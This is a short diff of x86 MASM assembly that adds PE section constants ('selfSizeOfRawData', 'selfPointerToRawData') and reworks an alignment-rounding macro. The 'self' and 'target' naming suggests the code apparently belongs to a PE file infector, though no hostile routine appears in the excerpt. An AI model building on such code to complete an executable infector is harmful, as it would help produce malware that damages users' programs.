@@ -12,6 +12,8 @@ option casemap: none
 	selfSection EQU 2
 	selfEntry EQU 3
 	selfHand EQU 4
+	selfSizeOfRawData EQU 5
+	selfPointerToRawData EQU 5
 	
 	tgHand EQU 5
 	tgImageBaseAddress EQU 1
@@ -162,11 +164,10 @@ setval MACRO handle:REQ, length:REQ, whence:=<SEEK_CUR>, disp:=<0>
 	invoke fromStack(fwrite), handle, daccess(tempDword), length, daccess(tempDword2), 0
 ENDM
 
-closest MACRO actual:REQ, alignment:REQ
+closest MACRO actual:=<eax>, alignment:=<ebx>
 	mov eax, actual
 	xor edx, edx
-	mov esi, alignment
-	idiv esi
+	idiv alignment
 	inc eax
 	imul eax, alignment
 	; Result is stored in eax
